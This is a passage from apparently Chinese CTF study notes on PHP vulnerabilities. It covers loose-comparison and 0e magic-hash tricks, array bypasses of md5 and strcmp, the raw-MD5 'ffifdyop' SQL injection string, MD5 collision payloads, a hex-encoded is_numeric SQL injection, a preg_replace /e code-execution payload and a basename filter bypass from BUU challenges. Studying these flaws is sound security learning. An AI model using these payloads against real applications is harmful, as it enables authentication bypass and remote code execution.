class="line">2.将某些字符转换为下划线（尝试后[好像不能被解析为_）</span><br><span class="line">3.删除参数名后的一些符号</span><br></pre></td></tr></table></figure><p><img src="/../images/1567560448_5d6f13004035f.png" alt="img"></p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><p>PHP7以前的版本支持将多进制的数值转换，所以’1’&#x3D;&#x3D;’0x1’是成立的，但新版本是false。</p><h3 id="x3D-x3D-（宽松比较）"><a href="#x3D-x3D-（宽松比较）" class="headerlink" title="&#x3D;&#x3D;（宽松比较）"></a>&#x3D;&#x3D;（宽松比较）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">其他数字==True</span><br></pre></td></tr></table></figure><h4 id="数字字符串与数字"><a href="#数字字符串与数字" class="headerlink" title="数字字符串与数字"></a>数字字符串与数字</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;   2asda&#x27;</span>==<span class="number">2</span>);<span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>这是因为在执行关系运算”&#x3D;&#x3D;“时要求运算符两边的数据类型必须一致(字符串与整型比较，字符串→整型)，当字符串转换为整型时，如果字符串以整型开头或者以空格+整型开头，就取整型的值，反之则取值0.</p><p>例子</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">payload:passwd=<span class="number">1234567</span>sdkasj  (不要加引号,默认接收字符串参数)</span><br></pre></td></tr></table></figure><h4 id="0e科学计数法"><a href="#0e科学计数法" class="headerlink" title="0e科学计数法"></a>0e科学计数法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0easdasd9&quot;</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>而当字符串中含有0e&#x2F;0E时，php会将0e这类字符串识别为科学技术法的数字，而0的多少次方都等于0，所以相等。</p><h3 id="x3D-x3D-x3D-（严格比较）"><a href="#x3D-x3D-x3D-（严格比较）" class="headerlink" title="&#x3D;&#x3D;&#x3D;（严格比较）"></a>&#x3D;&#x3D;&#x3D;（严格比较）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;0dff&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> === <span class="variable">$str</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;<span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>全等于操作过程如下：<br>1.判断两边数据类型是否相同  </p><p>2.判断两边值是否相同</p><p>3.将前两步的结果进行与运算，得出最终结果</p><h3 id="MD5缺陷"><a href="#MD5缺陷" class="headerlink" title="MD5缺陷"></a><strong>MD5缺陷</strong></h3><h5 id="①MD5（string-raw）函数解析"><a href="#①MD5（string-raw）函数解析" class="headerlink" title="①MD5（string,raw）函数解析"></a>①MD5（string,raw）函数解析</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;<span class="number">276</span>f722736c95d99e921722cf9ed621c</span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="number">6</span>�]��!r,��b</span><br><span class="line">当raw=<span class="literal">true</span>时，浏览器会对其返回的数据<span class="string">&#x27;or&#x27;</span><span class="number">6</span>\xc9]\x99\xe9!r,\xf9\xedb\x1c（原始二进制格式）进行了字符化处理，由此就会产生乱码。</span><br><span class="line">我们可以发现得到的字符串含有<span class="string">&#x27;or&#x27;</span><span class="number">6</span>,,可以用来进行sql注入</span><br><span class="line">如select * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> where password=<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>,<span class="literal">true</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;      <span class="number">04</span>a5c23ac138da22</span><br><span class="line"><span class="number">2</span>fec392304a5c23ac138da22847f9b7c</span><br><span class="line">我们可以发现md5的密文中，<span class="number">16</span>位密文与<span class="number">32</span>位密文的第<span class="number">8</span>-<span class="number">24</span>位子字符串是一样的。</span><br></pre></td></tr></table></figure><h5 id="②弱类型比较"><a href="#②弱类型比较" class="headerlink" title="②弱类型比较"></a>②弱类型比较</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP在处理哈希字符串时，通过!=或==来对哈希值进行比较，当哈希值开头为<span class="number">0</span>e时，在比较的时候会将其视作为科学计数法，而<span class="number">0</span>的多少次方还是<span class="number">0</span></span><br><span class="line">所以<span class="title function_ invoke__">MD5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)==<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;s878926199a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">    </span><br><span class="line"><span class="number">1586264293</span></span><br><span class="line"><span class="number">0e622743671155995737639662718498</span></span><br><span class="line">    </span><br><span class="line"><span class="number">240610708</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0e215962017</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)=<span class="number">0e291242476940776845150308577824</span></span><br></pre></td></tr></table></figure><h5 id="③强比较绕过"><a href="#③强比较绕过" class="headerlink" title="③强比较绕过"></a>③强比较绕过</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在使用===或！==来进行强比较时</span><br><span class="line">    </span><br><span class="line">可以通过构造参数为数组类型来进行绕过</span><br><span class="line">原理：<span class="title function_ invoke__">md5</span>()函数无法处理数组类型的数值，会直接返回<span class="literal">NULL</span></span><br><span class="line">那么<span class="title function_ invoke__">MD5</span>(param1[])===<span class="title function_ invoke__">MD5</span>(param2[])从而绕过</span><br><span class="line">当然弱类型比较也可以使用这种方法来进行绕过</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>)</span><br><span class="line">&gt;&gt;payload:id[]=xxx&amp;gg[]=xxx</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">但是当限制了传入的参数必须为<span class="keyword">string</span>类型时上述方法就不可以了</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">使用md5碰撞生成相同md5</span><br><span class="line"></span><br><span class="line">url编码 <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%CEZr%C6%<span class="number">1</span>D%<span class="number">28</span>j%<span class="number">22</span>%<span class="number">9</span>E%<span class="number">60</span>%<span class="number">8</span>Dt%AB4%ADU%E5%<span class="number">8</span>B%<span class="number">89</span>%<span class="number">89</span>%E6j%D0FH%EE8%D1%E6%<span class="number">11</span>%<span class="number">18</span>%AB3%A6%EC%E3%B8%<span class="number">2</span>F%<span class="number">3</span>C%<span class="number">97</span>k%<span class="number">0</span>CIt%<span class="number">02</span>%<span class="number">94</span>%<span class="number">92</span>W%<span class="number">9</span>D%ED%B9%EDc%CC%<span class="number">5</span>D%<span class="number">2</span>A%A1%<span class="number">9</span>B%B3%<span class="number">7</span>B%<span class="number">27</span>%<span class="number">13</span>i%<span class="number">05</span>%<span class="number">8</span>A%A7%<span class="number">5</span>E%B3J%BE.R%A6%D7%D5%<span class="number">7</span>C%A4%<span class="number">24</span>%A5%DB%<span class="number">84</span>%D8%E7%A3%<span class="number">03</span>%E4F%EC%<span class="number">1</span>C%<span class="number">95</span>%B1%D6L%<span class="number">88</span>%AD%CD%D5%CF%B6%E8%<span class="number">26</span>%AEff%<span class="number">2</span>A%<span class="number">3</span>B%C9%D9%<span class="number">9</span>B%C8z%<span class="number">7</span>E%DB%A4m%C5%<span class="number">8</span>F%CF%<span class="number">83</span>%<span class="number">06</span>%<span class="number">5</span>E%EA%CCW%B3M%<span class="number">3</span>E%C8</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">url编码 <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%CEZr%C6%<span class="number">1</span>D%<span class="number">28</span>j%<span class="number">22</span>%<span class="number">9</span>E%<span class="number">60</span>%<span class="number">8</span>Dt%AB4%ADU%E5%<span class="number">8</span>B%<span class="number">89</span>%<span class="number">09</span>%E6j%D0FH%EE8%D1%E6%<span class="number">11</span>%<span class="number">18</span>%AB3%A6%EC%E3%B8%<span class="number">2</span>F%<span class="number">3</span>C%<span class="number">97</span>k%<span class="number">0</span>CIt%<span class="number">02</span>%<span class="number">14</span>%<span class="number">93</span>W%<span class="number">9</span>D%ED%B9%EDc%CC%<span class="number">5</span>D%<span class="number">2</span>A%A1%<span class="number">9</span>B%B3%FB%<span class="number">27</span>%<span class="number">13</span>i%<span class="number">05</span>%<span class="number">8</span>A%A7%<span class="number">5</span>E%B3J%BE.R%A6%D7%D5%<span class="number">7</span>C%A4%<span class="number">24</span>%A5%DB%<span class="number">84</span>%D8%E7%<span class="number">23</span>%<span class="number">03</span>%E4F%EC%<span class="number">1</span>C%<span class="number">95</span>%B1%D6L%<span class="number">88</span>%AD%CD%D5%CF%B6%E8%<span class="number">26</span>%AEff%<span class="number">2</span>A%<span class="number">3</span>B%C9%D9%<span class="number">9</span>BHz%<span class="number">7</span>E%DB%A4m%C5%<span class="number">8</span>F%CF%<span class="number">83</span>%<span class="number">06</span>%<span class="number">5</span>E%EA%CC%D7%B3M%<span class="number">3</span>E%C8</span><br></pre></td></tr></table></figure><h2 id="语言构造器"><a href="#语言构造器" class="headerlink" title="语言构造器"></a>语言构造器</h2><p>[语言构造器和变量函数]<a href="https://segmentfault.com/q/1010000000188609">https://segmentfault.com/q/1010000000188609</a></p><p><img src="/../images/image-20220701135401603-1687677391910.png" alt="image-20220701135401603">当解释器遇到：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hello world&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这样的一个表达式的时候，并不会把它转换成函数调用，而是直接映射到一系列预先定义好的操作。使用语言构成的时候可以加括号，也可以不加括号，但是使用函数的时候必须加括号。</p><h2 id="精度缺陷"><a href="#精度缺陷" class="headerlink" title="精度缺陷"></a>精度缺陷</h2><p>php最大精度是14位，如果超出14位会衰减</p><p><img src="/../images/1598509437.png!small" alt="1598509437.png!small"></p><p><img src="/../images/1598509504.png!small" alt="1598509504.png!small"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;trick1 !== <span class="variable language_">$this</span>-&gt;trick2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick1) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick2) &amp;&amp; <span class="variable language_">$this</span>-&gt;trick1 != <span class="variable language_">$this</span>-&gt;trick2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">trick1=<span class="number">0.1</span>&amp;trick2=<span class="number">0.100000000000001</span></span><br><span class="line"></span><br><span class="line">都为INF/<span class="title function_ invoke__">NAN</span>(极小/极大)</span><br></pre></td></tr></table></figure><h2 id="strcmp-–数值比较"><a href="#strcmp-–数值比较" class="headerlink" title="strcmp()–数值比较"></a>strcmp()–数值比较</h2><p>使用条件：php&gt;&#x3D;5.3</p><p>当程序逻辑进行了数值的比较时，可以尝试比较函数是否为strcmp()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">strcmp</span> ( <span class="keyword">string</span> <span class="variable">$str1</span> , <span class="keyword">string</span> <span class="variable">$str2</span> )</span><br><span class="line">如果 str1 小于 str2 返回 &lt; <span class="number">0</span>； 如果 str1 大于 str2 返回 &gt; <span class="number">0</span>；如果两者相等，返回 <span class="number">0</span>。(区分大小写)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">但是<span class="title function_ invoke__">strcmp</span>()比较的对象是字符串和数组的时候，虽然会报错，但是仍然会直接返回<span class="number">0</span>，这样通过把目标变量设置成数组就可以绕过该函数的限制。</span><br><span class="line"><span class="comment">#php7.0</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$password</span> = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="variable">$password</span>))<span class="comment">//字符串与数组进行比较</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;Warning: <span class="title function_ invoke__">strcmp</span>() expects parameter <span class="number">2</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /usercode/file.php on line <span class="number">3</span></span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><h2 id="intval-–php5"><a href="#intval-–php5" class="headerlink" title="intval()–php5"></a>intval()–php5</h2><p><img src="/../images/image-20220922202838221-1687432076954.png" alt="image-20220922202838221"></p><h2 id="is-numeric（）"><a href="#is-numeric（）" class="headerlink" title="is_numeric（）"></a>is_numeric（）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;  <span class="comment">//是 values($s) 不是values(&#x27;$s&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">上面这个片段程序是判断参数s是否为数字，是则返回数字，不是则返回<span class="number">0</span>，然后带入数据库查询。（这样就构造不了sql语句）</span><br><span class="line">我们可以把‘<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="string">&#x27; 转换为16进制 0x31206f722031 为s参数的值</span></span><br><span class="line"><span class="string">l</span></span><br></pre></td></tr></table></figure><h2 id="array-search-x2F-in-array"><a href="#array-search-x2F-in-array" class="headerlink" title="array_search&#x2F;in_array"></a>array_search&#x2F;in_array</h2><blockquote><p>大海捞针，在大海（<code>haystack</code>）中搜索针（ <code>needle</code>），如果没有设置 <code>strict</code> 则使用宽松的比较。</p></blockquote><p>参数：(<a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$needle</code>, array <code>$haystack</code>, bool <code>$strict</code> &#x3D; <strong><code>false</code></strong>): bool</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当模式为<span class="literal">false</span>时，其查找是通过==来比较的</span><br><span class="line"></span><br><span class="line">当模式为<span class="literal">true</span>时，其查找是通过===来比较的</span><br></pre></td></tr></table></figure><h2 id="escapeshellarg和escapeshellcmd"><a href="#escapeshellarg和escapeshellcmd" class="headerlink" title="escapeshellarg和escapeshellcmd"></a>escapeshellarg和escapeshellcmd</h2><p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p><p><a href="https://www.anquanke.com/post/id/107336">https://www.anquanke.com/post/id/107336</a></p><h2 id="preg"><a href="#preg" class="headerlink" title="preg"></a>preg</h2><h4 id="preg-match（正则表达式，待匹配字符串，捕获分组）"><a href="#preg-match（正则表达式，待匹配字符串，捕获分组）" class="headerlink" title="preg-match（正则表达式，待匹配字符串，捕获分组）"></a>preg-match（正则表达式，待匹配字符串，捕获分组）</h4><blockquote><p>**preg_match()<strong>返回 <code>pattern</code> 的匹配次数。 它的值将是0次（不匹配）或1次，因为</strong>preg_match()**在第一次匹配后 将会停止搜索。</p></blockquote><p>漏洞</p><p>1.参数为字符串，传递数组返回false</p><p>2.<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">利用PCRE回溯次数限制绕过</a></p><p>php低版本</p><p>2.非&#x2F;s模式下不匹配换行符%0a<br>3.非&#x2F;m模式下不匹配多行</p><h4 id="preg-replace（正则表达式，替换字符，待匹配字符串，替换次数）"><a href="#preg-replace（正则表达式，替换字符，待匹配字符串，替换次数）" class="headerlink" title="preg_replace（正则表达式，替换字符，待匹配字符串，替换次数）"></a>preg_replace（正则表达式，替换字符，待匹配字符串，替换次数）</h4><ol><li><p>替换次数默认为1，可以用双写绕过</p></li><li><p>&#x2F;e模式下的代码执行 （php5.5版本以下）</p></li></ol><p>buu–[BJDCTF2020]ZJCTF，不过如此</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span>(<span class="params"><span class="variable">$regex</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>.<span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">complexStrtolower</span>(<span class="variable">$regex</span>, <span class="variable">$value</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在&#x2F;e模式下，如果正则匹配成功，就会执行preg_replace()的第二个参数</p><p>相当于 <strong>eval(‘strtolower(“\1”);’)</strong> </p><p>如何利用\1实现代码执行呢？</p><p>注意到第一个参数所代表的正则表达式，是将匹配到的字符作为捕获分组，而捕获分组下标是从1开始的，即匹配到的字符会代替\1→<strong>eval(‘strtolower(“payload”);’)</strong> </p><p><img src="file://E:\typora%20img\image-20220706125956030.png?lastModify=1657113567" alt="image-20220706125956030"></p><p>还有一个注意点是”payload”是由双引号包围起来的，再配合可变变量，才能够执行任意代码。</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">\S*=$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125; </span><br><span class="line"></span><br><span class="line">\S*→<span class="variable">$regex</span> 用于正则匹配/捕获</span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;→<span class="variable">$value</span> 待匹配字符</span><br><span class="line">$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;:要将待匹配字符构造成可变变量的形式才可以执行<span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line">可变变量：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$hello</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt; hello world</span><br></pre></td></tr></table></figure><h2 id="basename"><a href="#basename" class="headerlink" title="basename"></a>basename</h2><p><strong>basename会忽略一些奇怪的字符<code>%80 ~ %ff</code>。</strong></p><p>buu —-[Zer0pts2020]Can you guess it?</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;config\.php\/*$&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标：basename($_SERVER[‘PHP_SELF’]&#x3D;&#x3D;config.php</p><ol><li>需要绕过过滤config.php/*$，$匹配末尾，所以只要在config.php后添加字符即可绕过。</li><li>$_SERVER[‘PHP_SELF’]：返回的是当前文件相对于根目录的路径host&#x2F;$_SERVER[“PHP_SELF”]即url&#x3D;&#x3D;host&#x2F;$_SERVER[“PHP_SELF”]</li><li>basename：返回当前文件名即最后一个&#x2F;xxx中的xxx</li></ol><p><img src="/../images/image-20220706205913114-1687432076955.png" alt="image-20220706205913114"></p><p>为了绕过正则，需要在1.php后加字符</p><p><img src="/../images/image-20220706210043797-1687432076955.png" alt="image-20220706210043797"></p><p>但是这样basename匹配到的就不是1.php了</p><p>不过basename有一个特性就是：如果匹配到的文件名头是不可打印字符，会把它忽略掉</p><p><img src="/../images/image-20220706210252351-1687432076955.png" alt="image-20220706210252351"></p><p>这样basename原先匹配到的是%81，但是%81是不可打印字符，会把它忽略掉，所以就会往前匹配，匹配到1.php</p><p><img 